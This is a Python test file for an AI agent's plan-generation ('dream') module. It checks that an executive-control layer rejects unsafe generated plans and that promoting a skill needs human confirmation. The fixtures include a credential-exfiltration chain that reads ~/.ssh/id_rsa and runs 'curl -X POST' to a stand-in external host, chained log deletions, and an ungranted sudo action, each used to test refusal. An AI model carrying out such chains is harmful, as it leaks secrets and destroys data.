"""Tests for SecDogie's Tri-Network Creative Cognition Engine (``mind/dream.py``).

Covers all four biological-to-engineering mappings without any LLM or regex:
1. Hippocampal Deconstruction: ``ConcreteAnchor`` + 128-byte Episode-VSA -> ``CausalBrick``.
2. DMN Divergent Recombination:
   - Exact VSA Analogical Transfer ("定时清理临时文件" -> "自动整理下载目录").
   - Compositional Replay chaining ``ΔS+ -> S0`` across distinct past episodes.
3. Salience Network (SN): ``Familiarity`` (Sememe-VSA) ``novelty × goal_fit`` filtering out stale routines.
4. Executive Control Network (ECN):
   - ``WorldTrajectory`` killing compositional exfiltration dreams (secret read -> encode -> egress).
   - ``ActionGate`` killing destructive chains & ungranted elevated actions.
   - ``Cortex`` + ``decide`` killing harmful sparks.
   - ``promote_macro_skill`` requiring explicit human/sandbox confirmation before episodic writeback.
"""
from __future__ import annotations

import numpy as np
import pytest

from secdogie_citadel.action_gate import GateContext
from secdogie_citadel.cortex.curriculum import Lesson
from secdogie_citadel.cortex.episode_vsa import decode_episode
from secdogie_citadel.cortex.familiar import Familiarity
from secdogie_citadel.cortex.hippocampus import ConcreteAnchor, Hippocampus
from secdogie_citadel.mind.dream import (
    CausalBrick,
    TargetDomain,
    analogical_transfer,
    compositional_replay,
    deconstruct_anchor,
    deconstruct_hippocampus,
    dream_cycle,
    promote_macro_skill,
    score_salience,
    verify_spark,
)


def _dummy_key(seed: int, dim: int = 32) -> np.ndarray:
    rng = np.random.default_rng(seed)
    return rng.standard_normal(dim).astype(np.float32)


def test_hippocampal_deconstruction_skips_failed_and_decodes_vsa_coord():
    hip = Hippocampus()
    ok_anchor = ConcreteAnchor(
        verbatim="定时清理临时文件 /tmp/cache",
        tool="file_tidy",
        entities=("temp_files",),
        paths=("/tmp/cache",),
        quantities=(("age", 7.0, "d"),),
        facts=(
            ("action", "organize"),
            ("object_class", "temp_files"),
            ("outcome", "succeeded"),
            ("pre", "temp_files_scanned"),
            ("add", "temp_files_clean"),
        ),
    )
    bad_anchor = ConcreteAnchor(
        verbatim="强制删除系统文件",
        tool="shell_exec",
        paths=("/etc/hosts",),
        facts=(("action", "delete"), ("object_class", "system"), ("outcome", "rejected")),
    )
    hip.keep(Lesson("定时清理临时文件", {"kind": "task"}), _dummy_key(1), anchor=ok_anchor)
    hip.keep(Lesson("强制删除系统文件", {"kind": "task"}), _dummy_key(2), anchor=bad_anchor)

    bricks = deconstruct_hippocampus(hip)
    assert len(bricks) == 1
    b = bricks[0]
    assert b.action == "organize"
    assert b.object_class == "temp_files"
    assert b.entity == "/tmp/cache"
    assert "temp_files_scanned" in b.preconditions
    assert "temp_files_clean" in b.delta_add
    assert len(b.vsa_coord) == 128

    # Direct anchor decode round-trip through codebook
    dec = decode_episode(b.vsa_coord, hip.codebook)
    assert dec["action"].matched and dec["action"].value == "organize"
    assert dec["entity"].matched and dec["entity"].value == "/tmp/cache"


def test_dmn_vsa_analogical_transfer_temp_files_to_downloads_dir():
    hip = Hippocampus()
    anchor = ConcreteAnchor(
        verbatim="定时清理临时文件 /tmp/cache",
        tool="file_tidy",
        entities=("temp_files",),
        paths=("/tmp/cache",),
        quantities=(("age", 7.0, "d"),),
        facts=(
            ("action", "organize"),
            ("object_class", "temp_files"),
            ("outcome", "succeeded"),
            ("pre", "temp_files_indexed"),
            ("add", "temp_files_tidy"),
        ),
    )
    hip.keep(Lesson("定时清理临时文件", {"kind": "task"}), _dummy_key(10), anchor=anchor)
    brick = deconstruct_hippocampus(hip)[0]

    target = TargetDomain(
        entity="~/Downloads",
        object_class="downloads_dir",
        label="下载目录",
        goal_atoms=frozenset({"downloads_dir_tidy"}),
    )
    spark = analogical_transfer(
        brick,
        target,
        codebook=hip.codebook,
        initial_state=frozenset({"downloads_dir_indexed"}),
    )
    assert spark is not None
    assert spark.mode == "analogical_transfer"
    assert len(spark.steps) == 1
    st = spark.steps[0]
    assert st.action == "organize"
    assert st.tool == "file_tidy"
    assert st.param == "age:7d"
    assert st.entity == "~/Downloads"
    assert st.object_class == "downloads_dir"
    assert "downloads_dir_tidy" in spark.terminal_state
    assert "下载目录" in spark.description
    assert len(spark.vsa_coord) == 128
    assert spark.vsa_coord != brick.vsa_coord


def test_dmn_compositional_replay_chains_delta_s_to_next_s0():
    b1 = CausalBrick(
        brick_id="b-scan",
        action="scan",
        object_class="downloads_dir",
        entity="~/Downloads",
        tool="fs_scan",
        preconditions=frozenset({"downloads_present"}),
        delta_add=frozenset({"downloads_indexed"}),
        description="扫描下载目录文件列表",
    )
    b2 = CausalBrick(
        brick_id="b-group",
        action="organize",
        object_class="downloads_dir",
        entity="~/Downloads",
        tool="fs_move",
        preconditions=frozenset({"downloads_indexed"}),
        delta_add=frozenset({"downloads_categorized"}),
        description="按类型归档下载目录文件",
    )
    b3 = CausalBrick(
        brick_id="b-report",
        action="summarize",
        object_class="downloads_dir",
        entity="~/Downloads/summary.md",
        tool="doc_write",
        preconditions=frozenset({"downloads_categorized"}),
        delta_add=frozenset({"summary_ready"}),
        description="生成整理报告摘要",
    )
    # Disconnected brick whose precondition is never met
    b_unmet = CausalBrick(
        brick_id="b-unmet",
        action="backup",
        object_class="nas",
        entity="/mnt/nas",
        preconditions=frozenset({"nas_mounted"}),
        delta_add=frozenset({"backed_up"}),
        description="备份到 NAS",
    )

    sparks = compositional_replay(
        [b1, b2, b3, b_unmet],
        initial_state={"downloads_present"},
        max_depth=3,
    )
    assert len(sparks) >= 2
    # Must synthesize the 3-step unseen chain reaching summary_ready
    three_step = [s for s in sparks if len(s.steps) == 3 and "summary_ready" in s.terminal_state]
    assert len(three_step) == 1
    assert [st.action for st in three_step[0].steps] == ["scan", "organize", "summarize"]
    assert all("b-unmet" not in s.source_bricks for s in sparks)


def test_salience_network_filters_stale_routines_and_ranks_by_novelty_x_goal_fit():
    fam = Familiarity.with_sememe(["买牛奶提醒", "定时清理临时文件"])
    stale_brick = CausalBrick(
        brick_id="b-stale",
        action="remind",
        object_class="milk",
        entity="牛奶",
        delta_add=frozenset({"goal_done"}),
        description="买牛奶提醒",
    )
    novel_hit = CausalBrick(
        brick_id="b-novel-hit",
        action="organize",
        object_class="downloads_dir",
        entity="~/Downloads",
        delta_add=frozenset({"downloads_tidy", "goal_done"}),
        description="自动按年份归档下载目录的PDF合同",
    )
    novel_off_topic = CausalBrick(
        brick_id="b-novel-off",
        action="play",
        object_class="media",
        entity="爵士乐",
        delta_add=frozenset({"music_playing"}),
        description="播放一段从未听过的爵士乐协奏曲",
    )

    from secdogie_citadel.mind.dream import DreamSpark

    sparks = [
        DreamSpark("s-stale", "analogical_transfer", (stale_brick,), frozenset(), frozenset({"goal_done"}),
                   stale_brick.description, b"\x00" * 128),
        DreamSpark("s-hit", "analogical_transfer", (novel_hit,), frozenset(), frozenset({"downloads_tidy", "goal_done"}),
                   novel_hit.description, b"\x00" * 128),
        DreamSpark("s-off", "analogical_transfer", (novel_off_topic,), frozenset(), frozenset({"music_playing"}),
                   novel_off_topic.description, b"\x00" * 128),
    ]

    picked = score_salience(sparks, fam, goal_atoms={"downloads_tidy", "goal_done"}, top_k=3)
    assert len(picked) == 1
    assert picked[0].spark_id == "s-hit"
    assert picked[0].novelty >= 0.08
    assert picked[0].goal_fit == pytest.approx(1.0)
    assert picked[0].salience == pytest.approx(picked[0].novelty * picked[0].goal_fit)


def test_ecn_kills_compositional_exfiltration_dream_via_world_trajectory():
    """Even if DMN chains individually innocent-looking steps into secret exfiltration, ECN kills it."""
    step1 = CausalBrick(
        brick_id="b-read-key",
        action="read",
        object_class="credential",
        entity="~/.ssh/id_rsa",
        tool="file_read",
        preconditions=frozenset({"session_open"}),
        delta_add=frozenset({"key_loaded"}),
        description="read ~/.ssh/id_rsa",
    )
    step2 = CausalBrick(
        brick_id="b-upload",
        action="send",
        object_class="network",
        entity="https://external.example/upload",
        tool="http_post",
        preconditions=frozenset({"key_loaded"}),
        delta_add=frozenset({"backup_synced"}),
        description="curl -X POST https://external.example/upload",
    )
    sparks = compositional_replay([step1, step2], initial_state={"session_open"}, max_depth=2)
    assert len(sparks) == 1
    verdict = verify_spark(sparks[0])
    assert not verdict.accepted
    assert verdict.trajectory_verdict == "refuse"
    assert any("credential" in c or "exfil" in c for c in verdict.trajectory_chains)


def test_ecn_kills_destructive_chain_and_ungranted_capability_via_action_gate():
    s1 = CausalBrick(
        brick_id="b-del-1",
        action="delete",
        object_class="file",
        entity="/var/log/a.log",
        tool="fs_delete",
        preconditions=frozenset({"disk_full"}),
        delta_add=frozenset({"a_deleted"}),
        description="delete /var/log/a.log",
    )
    s2 = CausalBrick(
        brick_id="b-del-2",
        action="delete",
        object_class="file",
        entity="/var/log/b.log",
        tool="fs_delete",
        preconditions=frozenset({"a_deleted"}),
        delta_add=frozenset({"disk_freed"}),
        description="delete /var/log/b.log",
    )
    sparks = compositional_replay([s1, s2], initial_state={"disk_full"}, max_depth=2)
    assert len(sparks) == 1
    verdict = verify_spark(sparks[0])
    assert not verdict.accepted
    assert "destructive-chain" in verdict.gate_findings

    # Also verify capability enforcement kills elevated execution
    elev = CausalBrick(
        brick_id="b-elev",
        action="run_elevated",
        object_class="system",
        entity="sudo service restart",
        tool="shell_elevated",
        preconditions=frozenset(),
        delta_add=frozenset({"restarted"}),
        description="sudo service restart",
    )
    from secdogie_citadel.mind.dream import DreamSpark

    sp_elev = DreamSpark("s-elev", "analogical_transfer", (elev,), frozenset(), frozenset({"restarted"}),
                         elev.description, b"\x00" * 128)
    v_elev = verify_spark(sp_elev, gate_context=GateContext(enforce_capabilities=True))
    assert not v_elev.accepted
    assert "out-of-capability" in v_elev.gate_findings


def test_full_dream_cycle_and_confirmed_macro_skill_promotion():
    hip = Hippocampus()
    fam = Familiarity.with_sememe(["定时清理临时文件", "扫描目录"])

    a1 = ConcreteAnchor(
        verbatim="扫描 /tmp/cache 目录索引",
        tool="fs_scan",
        entities=("temp_files",),
        paths=("/tmp/cache",),
        facts=(
            ("action", "scan"),
            ("object_class", "temp_files"),
            ("outcome", "succeeded"),
            ("pre", "workspace_ready"),
            ("add", "files_indexed"),
        ),
    )
    a2 = ConcreteAnchor(
        verbatim="按日期归档已索引的文件到归档箱",
        tool="file_tidy",
        entities=("archive_box",),
        paths=("~/Documents/Archive",),
        facts=(
            ("action", "organize"),
            ("object_class", "archive_box"),
            ("outcome", "succeeded"),
            ("pre", "files_indexed"),
            ("add", "workspace_clean"),
        ),
    )
    hip.keep(Lesson(a1.verbatim, {"kind": "task"}), _dummy_key(21), anchor=a1)
    hip.keep(Lesson(a2.verbatim, {"kind": "task"}), _dummy_key(22), anchor=a2)

    report = dream_cycle(
        memory=hip,
        familiar=fam,
        initial_state={"workspace_ready"},
        goal_atoms={"workspace_clean"},
        goal_text="自动整理归档工作区文件",
        target_domains=[
            TargetDomain(
                entity="~/Downloads",
                object_class="downloads_dir",
                label="下载目录",
                goal_atoms=frozenset({"workspace_clean"}),
            )
        ],
        top_k=5,
    )

    assert len(report.bricks) == 2
    assert report.generated_count >= 2
    assert len(report.verified_skills) >= 1
    skill = report.verified_skills[0]
    assert skill.ecn.accepted
    assert skill.requires_confirmation

    # Unconfirmed promotion MUST be refused
    with pytest.raises(PermissionError):
        promote_macro_skill(skill, memory=hip, familiar=fam, confirmed=False)

    # Confirmed promotion writes back lossless ConcreteAnchor + learns familiarity
    before_len = len(hip)
    anchor = promote_macro_skill(skill, memory=hip, familiar=fam, confirmed=True, timestamp_ms=1700000000000)
    assert len(hip) == before_len + 1
    assert anchor.vsa_coord == skill.vsa_coord
    assert "verified_macro_skill" in dict(anchor.facts).values()
    view = report.view()
    assert view["bricks"] == 2
    assert len(view["verified_skills"]) >= 1
